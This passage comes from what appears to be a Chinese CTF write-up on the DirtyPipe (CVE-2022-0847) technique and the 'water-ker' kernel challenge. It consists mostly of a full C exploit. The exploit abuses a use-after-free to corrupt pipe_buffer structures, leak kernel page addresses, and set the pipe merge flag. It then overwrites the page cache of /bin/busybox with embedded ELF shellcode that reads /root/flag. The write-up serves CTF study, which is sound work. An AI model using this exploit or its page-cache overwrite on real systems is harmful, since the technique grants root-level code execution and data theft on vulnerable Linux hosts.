class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x68</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>,<br>                <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x6a</span>,<br>                <span class="hljs-number">0x02</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0xff</span>,<br>                <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5f</span>,<br>                <span class="hljs-number">0x99</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xEB</span><br>        &#125;;<br> <br>        <span class="hljs-keyword">if</span> (write(pipe_fd[<span class="hljs-number">1</span>], elfcode, <span class="hljs-keyword">sizeof</span>(elfcode)) &lt; <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Failed to write page cache&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>改完的busybox大概是这样，剩了一段</p><img src="/2024/01/12/CVE-2022-0847-DirtyPipe/busybox.png" class title="busybox"><p>实际执行的代码</p><img src="/2024/01/12/CVE-2022-0847-DirtyPipe/elfcode.png" class title="elfcode"><ul><li><p>先open &#x2F;root&#x2F;flag</p><img src="/2024/01/12/CVE-2022-0847-DirtyPipe/open.png" class title="open"></li><li><p>再利用sendfile读出flag的内容</p><img src="/2024/01/12/CVE-2022-0847-DirtyPipe/sendfile.png" class title="sendfile"></li></ul><h1 id="2023强网拟态-water-ker"><a href="#2023强网拟态-water-ker" class="headerlink" title="2023强网拟态 water-ker"></a>2023强网拟态 water-ker</h1><p>区别还是在取得第二个uaf之后</p><ul><li><p>泄露splice之后的page地址，这时flags已经是0了</p><img src="/2024/01/12/CVE-2022-0847-DirtyPipe/splice.png" class title="splice"></li><li><p>覆写，把flags改为0x10</p></li><li><p>写入elfcode</p></li></ul><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NUM 200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><br><span class="hljs-type">int</span> fd_water;<br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> orig_pid = <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> victim_pid = PIPE_SPRAY_NUM / <span class="hljs-number">2</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">info_pipe_buf</span>;</span><br><span class="hljs-type">int</span> snd_orig_pid = <span class="hljs-number">-1</span>, snd_vicitm_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">water_struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> *buf;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_chunk</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">water_struct</span> <span class="hljs-title">tmp</span> =</span> &#123;<br>        .buf = data,<br>    &#125;;<br>    ioctl(fd_water, <span class="hljs-number">0x20</span>, &amp;tmp);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_chunk</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">water_struct</span> <span class="hljs-title">tmp</span> =</span> &#123;<br>        .buf = <span class="hljs-literal">NULL</span>,<br>    &#125;;<br>    ioctl(fd_water, <span class="hljs-number">0x30</span>, &amp;tmp);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_chunk</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">water_struct</span> <span class="hljs-title">tmp</span> =</span> &#123;<br>        .buf = data,<br>    &#125;;<br>    ioctl(fd_water, <span class="hljs-number">0x50</span>, &amp;tmp);<br>&#125;<br><br><span class="hljs-type">char</span> temp_zero_buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br>    fd_water = open(<span class="hljs-string">&quot;/dev/water&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd_water &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;Fail to open the device water!&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] first extend pipe pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM / <span class="hljs-number">2</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] UAF...&quot;</span>);<br>    add_chunk(<span class="hljs-string">&quot;Eurus&quot;</span>);<br>    delete_chunk();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] second extend pipe pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = PIPE_SPRAY_NUM / <span class="hljs-number">2</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating pipe pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>        write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] edit one...&quot;</span>);<br>    edit_chunk(<span class="hljs-string">&quot;\x80&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for corruption...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i)<br>        &#123;<br>            orig_pid = nr;<br>            victim_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, <br>                   victim_pid, orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(victim_pid == <span class="hljs-number">-1</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">40</span> - <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid)<br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, <br>           info_pipe_buf.page, info_pipe_buf.ops);<br><br>    <span class="hljs-keyword">if</span>((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span> || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>    info_pipe_buf.page = (<span class="hljs-keyword">struct</span> page*)((<span class="hljs-type">size_t</span>) info_pipe_buf.page + <span class="hljs-number">0x40</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br>        <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>        <span class="hljs-keyword">if</span>(i == orig_pid || i == victim_pid)<br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span>(nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)<br>        &#123;<br>            snd_orig_pid = nr;<br>            snd_vicitm_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>                   snd_vicitm_pid, snd_orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(snd_vicitm_pid == <span class="hljs-number">-1</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">char</span> temp_buf[<span class="hljs-number">0x1000</span>];<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">0x60</span>);<br><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], temp_zero_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++)  write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-type">loff_t</span> offset = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> fd_busybox = open(<span class="hljs-string">&quot;/bin/busybox&quot;</span>, O_RDONLY);<br>    splice(fd_busybox, &amp;offset, pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">file_buf</span>;</span><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++)  read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;file_buf, <span class="hljs-keyword">sizeof</span>(file_buf));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] file_buf-&gt;page: \033[0m%p\n&quot;</span>, <br>           file_buf.page);<br><br>    file_buf.offset = <span class="hljs-number">0</span>;<br>    file_buf.len = <span class="hljs-number">0</span>;<br>    file_buf.flags = <span class="hljs-number">0x10</span>;<br><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], temp_zero_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;file_buf, <span class="hljs-keyword">sizeof</span>(file_buf));<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> elfcode[] = &#123;<br>        <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span 